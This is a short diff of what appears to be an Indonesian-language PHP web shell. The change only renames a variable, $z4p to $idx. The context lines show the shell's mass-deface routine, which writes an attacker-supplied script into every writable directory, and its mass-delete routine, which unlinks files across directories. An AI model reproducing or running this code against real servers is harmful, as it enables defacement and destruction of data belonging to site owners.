@@ -198,7 +198,7 @@ if($_GET['to'] == 'asokoe') {
 						if(is_writable($dirc)) {
 							echo "[<font color=lime>DONE</font>] $lokasi<br>";
 							file_put_contents($lokasi, $isi_script);
-							$z4p = sabun_massal($dirc,$namafile,$isi_script);
+							$idx = sabun_massal($dirc,$namafile,$isi_script);
 						}
 					}
 				}
@@ -271,7 +271,7 @@ if(is_writable($dir)) {
                    if(file_exists($lokasi)) {
                        echo "[<font color=#52CF38>Terhapus</font>] $lokasi<br>";
                        unlink($lokasi);
-                       $z4p = hapus_massal($dirc,$namafile);
+                       $idx = hapus_massal($dirc,$namafile);
                    }
                }
            }
